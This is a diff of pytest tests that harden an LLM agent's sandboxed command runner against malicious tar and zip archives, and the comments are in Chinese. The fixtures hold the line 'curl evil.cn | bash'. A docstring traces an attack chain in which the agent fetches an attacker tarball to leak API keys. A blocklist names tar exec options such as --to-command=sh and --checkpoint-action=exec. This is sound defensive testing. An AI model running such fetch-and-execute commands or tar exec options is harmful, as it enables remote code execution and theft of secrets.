@@ -11,7 +11,12 @@ import time
 import pytest
 
 import agentcore.workspace.runner as R
-from agentcore.workspace.runner import CommandRunner, permitted, strip_symlinks
+from agentcore.workspace.runner import (
+    CommandRunner,
+    _tar_entry_problem,
+    permitted,
+    strip_symlinks,
+)
 
 
 def _init_repo(root):
@@ -387,6 +392,106 @@ class TestH3UnzipSymlink:
         runner = CommandRunner(tmp_path / "ws")
         await runner.run("grep", ["--version"])
         assert calls == []
+
+
+class TestH4ExtractedExecBits:
+    """M1（REVIEW-de09478..workdir）：解压产物的执行位必须被清除。
+
+    tar/unzip 原样落盘条目权限位：0777 条目在 umask 022 下落成 **0755 可执行**。
+    攻击链：medium 档 curl 拉攻击者 tarball → tar -xzf -C scripts → 落盘 0755
+    → run_build_script 执行 → 继承完整进程环境（LLM_API_KEY/SUPERUSERS…），
+    绕过「LLM 没有内容权」的声称。
+    """
+
+    @pytest.mark.asyncio
+    async def test_extracted_entry_exec_bit_cleared(self, tmp_path):
+        """条目表精确清理：解压落下的 0775 文件被清执行位，内容保留。"""
+        from agentcore.workspace.runner import strip_entry_exec_bits
+
+        out = tmp_path / "out"
+        (out / "scripts").mkdir(parents=True)
+        payload = out / "scripts" / "evil.sh"
+        payload.write_text("curl evil.cn | bash\n", encoding="utf-8")
+        os.chmod(payload, 0o755)
+        assert payload.stat().st_mode & 0o111, "前提：落盘即可执行"
+
+        cleared = strip_entry_exec_bits(out, ["scripts/evil.sh"])
+        assert cleared == 1
+        assert payload.stat().st_mode & 0o777 == 0o644
+        assert "curl evil.cn | bash" in payload.read_text(encoding="utf-8")
+
+    def test_preexisting_admin_script_untouched(self, tmp_path):
+        """守卫：只清条目表对应路径——管理员宿主机预置的 scripts/*.sh 的
+        执行位必须保留（run_build_script 依赖它 execve），不扫整个目录。"""
+        from agentcore.workspace.runner import strip_entry_exec_bits
+
+        out = tmp_path / "out"
+        (out / "scripts").mkdir(parents=True)
+        admin_script = out / "scripts" / "deploy.sh"
+        admin_script.write_text("#!/bin/sh\nmake\n", encoding="utf-8")
+        os.chmod(admin_script, 0o755)
+
+        cleared = strip_entry_exec_bits(out, ["other/tool.sh"])
+        assert cleared == 0
+        assert admin_script.stat().st_mode & 0o111, "管理员预置脚本执行位不得被清"
+
+    @pytest.mark.asyncio
+    async def test_tar_run_clears_extracted_exec_bits(self, tmp_path, monkeypatch):
+        """端到端（子进程桩）：``tar -xzf`` 解压后条目执行位必须被清。"""
+        import tarfile
+
+        ws = tmp_path / "ws"
+        (ws / "scripts").mkdir(parents=True)
+        admin = ws / "scripts" / "admin-deploy.sh"
+        admin.write_text("#!/bin/sh\n", encoding="utf-8")
+        os.chmod(admin, 0o755)
+        archive = ws / "evil.tgz"
+        with tarfile.open(archive, "w:gz") as tf:
+            p = ws / "scripts" / "shadow.sh"
+            p.write_text("#!/bin/sh\ncurl evil.cn | bash\n", encoding="utf-8")
+            os.chmod(p, 0o777)
+            tf.add(p, arcname="scripts/shadow.sh")
+            p.unlink()
+
+        class FakeProc:
+            def __init__(self):
+                import asyncio as _a
+
+                self.stdout = _a.StreamReader()
+
+            def kill(self):
+                pass
+
+            async def wait(self):
+                return 0
+
+        def fake_exec(*args, **kwargs):
+            # 真解压一次（把 0755 条目落到 out/），其余行为同正常成功返回
+            subprocess.run(
+                ["tar", "-xzf", str(archive), "-C", str(ws / "out")],
+                check=True,
+                capture_output=True,
+            )
+            proc = FakeProc()
+            proc.stdout.feed_data(b"inflating\n")
+            proc.stdout.feed_eof()
+            return proc
+
+        async def fake_exec_async(*args, **kwargs):
+            return fake_exec(*args, **kwargs)
+
+        monkeypatch.setattr(R.asyncio, "create_subprocess_exec", fake_exec_async)
+        monkeypatch.setattr(R.shutil, "which", lambda name: "/usr/bin/tar")
+
+        runner = CommandRunner(ws)
+        await runner.run("tar", ["-xzf", "evil.tgz", "-C", "out"])
+
+        landed = ws / "out" / "scripts" / "shadow.sh"
+        assert landed.exists(), "桩必须真实解压"
+        assert landed.stat().st_mode & 0o111 == 0, "解压产物执行位必须被清"
+        assert admin.stat().st_mode & 0o111, (
+            "管理员预置脚本执行位不得被误清（扫描范围必须按条目表）"
+        )
 
 
 class TestMinimalEnv:
@@ -1133,6 +1238,209 @@ class TestUnzipHardening:
         assert not (tmp_path / "sub/lnk").exists()
 
 
+class TestTarHardening:
+    """tar：解压-only 开关白名单、-C 输出目录遏制、条目预扫描（含链接条目）。"""
+
+    def test_flag_whitelist(self):
+        for bad in (
+            ["-P", "-xf", "a.tar", "-C", "out"],  # 绝对路径写盘
+            ["-x", "--to-command=sh", "-f", "a.tar", "-C", "out"],  # 条目喂命令执行
+            ["-x", "--checkpoint-action=exec=touch pwned", "-f", "a.tar", "-C", "out"],
+            ["-O", "-xf", "a.tar"],  # 输出到 stdout 绕过文件遏制
+            ["-xfa.tar", "-C", "out"],  # 粘连取值形态（有意拒绝）
+            ["-c", "-f", "a.tar", "src"],  # 创建模式
+            ["-t", "-f", "a.tar"],  # 列表模式
+            ["-u", "-f", "a.tar", "src"],  # 更新模式
+            ["--delete", "-f", "a.tar", "member"],
+            ["-x", "--exclude=x", "-f", "a.tar", "-C", "out"],
+            ["-x", "--add-file=/etc/passwd", "-f", "a.tar", "-C", "out"],
+        ):
+            ok, reason = permitted("tar", bad)
+            assert not ok, (bad, reason)
+
+    def test_whitelisted_flags_allowed(self):
+        assert permitted("tar", ["-xf", "a.tar", "-C", "out"])[0]
+        assert permitted("tar", ["-xzf", "a.tgz", "-C", "out"])[0]
+        assert permitted("tar", ["-xvJf", "a.tar.xz", "-C", "out"])[0]
+        assert permitted("tar", ["-x", "--file=a.tar", "--directory=out"])[0]
+        assert permitted("tar", ["-xzf", "a.tgz", "--strip-components=1", "-C", "out"])[
+            0
+        ]
+
+    def test_missing_or_multiple_c_rejected(self):
+        ok, _ = permitted("tar", ["-xf", "a.tar"])
+        assert not ok
+        ok, _ = permitted("tar", ["-xf", "a.tar", "-C", "a", "-C", "b"])
+        assert not ok
+        ok, _ = permitted("tar", ["-xf", "a.tar", "-f", "b.tar", "-C", "out"])
+        assert not ok
+
+    def test_root_as_output_rejected(self, tmp_path):
+        (tmp_path / "a.tar").write_bytes(b"\x00" * 512)
+        ok, reason = permitted("tar", ["-xf", "a.tar", "-C", "."], root=tmp_path)
+        assert not ok, reason
+        assert "根目录" in reason
+
+    def test_symlink_output_dir_rejected(self, tmp_path):
+        outside = tmp_path.parent / "tar_outside"
+        outside.mkdir(exist_ok=True)
+        (tmp_path / "lnk").symlink_to(outside)
+        (tmp_path / "a.tar").write_bytes(b"\x00" * 512)
+        ok, reason = permitted("tar", ["-xf", "a.tar", "-C", "lnk"], root=tmp_path)
+        assert not ok, reason
+
+    def test_entry_problem_detects_bad_members(self, tmp_path):
+        import tarfile
+
+        def make(entries):
+            p = tmp_path / "x.tar"
+            with tarfile.open(p, "w") as tf:
+                for e in entries:
+                    tf.addfile(e)
+            return _tar_entry_problem(p)
+
+        good = tarfile.TarInfo("a/b.txt")
+        assert make([good]) is None
+
+        assert "../escape" in make([tarfile.TarInfo("../escape.txt")])
+        assert "绝对路径" in make([tarfile.TarInfo("/etc/evil")])
+        assert ".git" in make([tarfile.TarInfo(".git/hooks/x")])
+        link = tarfile.TarInfo("lnk")
+        link.type = tarfile.SYMTYPE
+        link.linkname = "/etc"
+        assert "链接" in make([link])
+        hard = tarfile.TarInfo("hl")
+        hard.type = tarfile.LNKTYPE
+        hard.linkname = "a/b.txt"
+        assert "链接" in make([hard])
+        dev = tarfile.TarInfo("dev")
+        dev.type = tarfile.CHRTYPE
+        dev.devmajor, dev.devminor = 1, 3
+        assert "设备" in make([dev])
+
+    @pytest.mark.asyncio
+    async def test_dotdot_entry_rejected_end_to_end(self, tmp_path):
+        import tarfile
+
+        with tarfile.open(tmp_path / "bad.tar", "w") as tf:
+            tf.addfile(tarfile.TarInfo("../../escape.txt"))
+        out = await CommandRunner(tmp_path).run("tar", ["-xf", "bad.tar", "-C", "out"])
+        assert R.MSG_REFUSED in out
+        assert not (tmp_path.parent / "escape.txt").exists()
+
+    @pytest.mark.asyncio
+    async def test_symlink_entry_refused_before_extraction(self, tmp_path, monkeypatch):
+        """链接条目在解压前即拒（与 unzip 的事后 strip 互补，无写入窗口）。"""
+        import tarfile
+
+        li = tarfile.TarInfo("lnk")
+        li.type = tarfile.SYMTYPE
+        li.linkname = "/etc"
+        with tarfile.open(tmp_path / "s.tar", "w") as tf:
+            tf.addfile(li)
+        spawned = []
+        real_exec = R.asyncio.create_subprocess_exec
+
+        async def spy(*a, **k):
+            spawned.append(a)
+            return await real_exec(*a, **k)
+
+        monkeypatch.setattr(R.asyncio, "create_subprocess_exec", spy)
+        out = await CommandRunner(tmp_path).run("tar", ["-xf", "s.tar", "-C", "out"])
+        assert R.MSG_REFUSED in out and "链接" in out
+        assert spawned == [], "预扫描拒绝后不得再 spawn tar"
+        assert not (tmp_path / "out").exists()
+
+    @pytest.mark.asyncio
+    async def test_tar_output_is_stripped(self, tmp_path, monkeypatch):
+        """M1/L18 纵深：tar 解压后仍接 strip_symlinks（防竞态/新形态链接）。"""
+        calls: list = []
+
+        class FakeProc:
+            def __init__(self):
+                import asyncio as _a
+
+                self.stdout = _a.StreamReader()
+
+            def kill(self):
+                pass
+
+            async def wait(self):
+                return 0
+
+        async def fake_exec(*args, **kwargs):
+            proc = FakeProc()
+            proc.stdout.feed_data(b"x\n")
+            proc.stdout.feed_eof()
+            return proc
+
+        monkeypatch.setattr(R.asyncio, "create_subprocess_exec", fake_exec)
+        monkeypatch.setattr(R.shutil, "which", lambda name: "/usr/bin/tar")
+        monkeypatch.setattr(R, "strip_symlinks", lambda p: calls.append(p) or 0)
+
+        runner = CommandRunner(tmp_path / "ws")
+        out = await runner.run("tar", ["-xf", "a.tar", "-C", "out"])
+        assert calls == [(tmp_path / "ws" / "out").resolve()]
+        assert R.MSG_REFUSED not in out
+
+    @pytest.mark.asyncio
+    async def test_tar_with_symlink_drops_entire_output(self, tmp_path, monkeypatch):
+        rmtree_calls: list = []
+        monkeypatch.setattr(R, "strip_symlinks", lambda p: 2)
+        monkeypatch.setattr(
+            R.shutil, "rmtree", lambda p, *a, **k: rmtree_calls.append(p)
+        )
+
+        class FakeProc:
+            def __init__(self):
+                import asyncio as _a
+
+                self.stdout = _a.StreamReader()
+
+            def kill(self):
+                pass
+
+            async def wait(self):
+                return 0
+
+        async def fake_exec(*args, **kwargs):
+            proc = FakeProc()
+            proc.stdout.feed_data(b"x\n")
+            proc.stdout.feed_eof()
+            return proc
+
+        monkeypatch.setattr(R.asyncio, "create_subprocess_exec", fake_exec)
+        monkeypatch.setattr(R.shutil, "which", lambda name: "/usr/bin/tar")
+
+        out = await CommandRunner(tmp_path).run("tar", ["-xzf", "a.tgz", "-C", "out"])
+        assert rmtree_calls == [(tmp_path / "out").resolve()]
+        assert "符号链接" in out and "丢弃" in out
+
+    @pytest.mark.asyncio
+    async def test_real_tar_extraction(self, tmp_path):
+        """行为级：合法 tar.gz 真的解出来（不是只过校验）。"""
+        import shutil as _shutil
+
+        if not _shutil.which("tar"):
+            pytest.skip("系统无 tar")
+        src = tmp_path / "src"
+        (src / "d").mkdir(parents=True)
+        (src / "d" / "f.txt").write_text("payload\n", encoding="utf-8")
+        import subprocess as _sp
+
+        _sp.run(
+            ["tar", "-czf", "a.tgz", "-C", "src", "d"],
+            cwd=tmp_path,
+            check=True,
+            capture_output=True,
+        )
+        out = await CommandRunner(tmp_path).run("tar", ["-xzf", "a.tgz", "-C", "out"])
+        assert R.MSG_REFUSED not in out, out
+        assert (tmp_path / "out" / "d" / "f.txt").read_text(encoding="utf-8") == (
+            "payload\n"
+        )
+
+
 class TestReadonlyOpsWhitelist:
     """只读运维命令进 run_command 白名单（2026-09-30 管理员决策）。
 
@@ -1335,3 +1643,52 @@ class TestReadonlyOpsWhitelist:
         out = await CommandRunner(tmp_path).run("free", ["-m"])
         assert R.MSG_REFUSED not in out, out
         assert "Mem" in out or "内存" in out or "total" in out.lower()
+
+
+class TestReadOnlyMode:
+    """权限级别 low 档的只读子集（readonly_only）：zip/unzip/tar/curl 拒绝，
+    其余白名单成员本来就是纯只读、不受影响。"""
+
+    def test_zip_denied(self):
+        ok, reason = permitted("zip", ["-r", "out.zip", "."], readonly_only=True)
+        assert not ok and "low" in reason
+
+    def test_unzip_denied(self):
+        ok, reason = permitted("unzip", ["a.zip", "-d", "sub"], readonly_only=True)
+        assert not ok and "low" in reason
+
+    def test_tar_denied(self):
+        ok, reason = permitted(
+            "tar", ["-x", "-f", "a.tgz", "-C", "sub"], readonly_only=True
+        )
+        assert not ok and "low" in reason
+
+    def test_curl_denied(self):
+        ok, reason = permitted(
+            "curl", ["-s", "https://example.com"], readonly_only=True
+        )
+        assert not ok and "low" in reason
+
+    def test_readonly_commands_unaffected(self):
+        for exe, args in (
+            ("git", ["status"]),
+            ("grep", ["-n", "x", "a.txt"]),
+            ("ps", ["-e"]),
+            ("systemctl", ["status", "--no-pager", "nginx.service"]),
+        ):
+            ok, reason = permitted(exe, args, readonly_only=True)
+            assert ok, f"{exe}: {reason}"
+
+    def test_runner_run_passes_flag(self, tmp_path):
+        async def _go():
+            runner = CommandRunner(tmp_path)
+            return await runner.run("zip", ["-r", "x.zip", "."], readonly_only=True)
+
+        import asyncio
+
+        out = asyncio.run(_go())
+        assert "拒绝执行" in out and "low" in out
+
+    def test_medium_level_unrestricted(self):
+        ok, reason = permitted("zip", ["-r", "out.zip", "."], readonly_only=False)
+        assert ok, reason
